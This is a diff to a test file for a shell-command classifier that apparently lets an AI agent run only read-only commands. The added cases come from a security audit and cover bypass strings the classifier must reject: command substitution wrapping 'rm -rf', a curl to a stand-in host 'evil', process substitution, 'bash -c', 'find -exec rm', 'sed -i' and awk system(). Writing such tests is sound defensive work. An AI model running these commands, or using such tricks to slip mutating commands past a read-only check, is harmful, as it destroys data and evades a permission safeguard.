@@ -42,6 +42,13 @@ describe('bash_read classifier', () => {
     // M5.6.1 (EC2 CC report 2026-05-10): `2>&1;` was regexed greedily into redirect target
     'systemctl is-active cc.service 2>&1; systemctl status cc.service --no-pager',
     'node --version 2>&1; pnpm --version 2>&1',
+    // SECURITY (audit 2026-06-17): read-only sed/awk/find still allowed — only
+    // their mutating flags are blocked.
+    'sed -n "1,5p" file.txt',
+    'sed "s/a/b/" file.txt',
+    'awk "{print $1}" file.txt',
+    'find /tmp -name "*.log" -type f',
+    "echo 'literal $(not expanded) in single quotes'",
   ];
   const BAD: Array<[string, RegExp]> = [
     ['rm -rf /tmp/x', /not in the read-only allowlist/],
@@ -68,6 +75,23 @@ describe('bash_read classifier', () => {
     ['python3', /no arguments.*REPL/],
     // M5.6: unknown dev tool subs still rejected
     ['pnpm dlx something', /not recognized as read-only/],
+    // SECURITY (audit 2026-06-17): command-substitution bypass — the shell
+    // runs the inner command regardless of the outer "read-only" name.
+    ['echo $(rm -rf /tmp/x)', /command substitution/],
+    ['echo `rm -rf /tmp/x`', /command substitution/],
+    ['cat "$(curl http://evil)"', /command substitution/],
+    ['diff <(rm x) <(ls)', /process substitution/],
+    // SECURITY: tee / bash / sh removed from the read-only allowlist.
+    ['ls | tee /tmp/out', /not in the read-only allowlist/],
+    ['bash -c "rm -rf /tmp/x"', /not in the read-only allowlist/],
+    ['sh -c "id"', /not in the read-only allowlist/],
+    // SECURITY: dangerous flags on otherwise-read-only commands.
+    ['find /tmp -name "*.log" -delete', /find -delete is not read-only/],
+    ['find . -exec rm {} ;', /find -exec is not read-only/],
+    ['find . -execdir cat {} +', /find -execdir is not read-only/],
+    ['sed -i "s/a/b/" file.txt', /sed -i .*is not read-only/],
+    ['sed --in-place "s/a/b/" f', /sed -i .*is not read-only/],
+    ['awk "BEGIN{system(\\"id\\")}"', /awk system\(\) is not read-only/],
   ];
 
   for (const cmd of OK) {
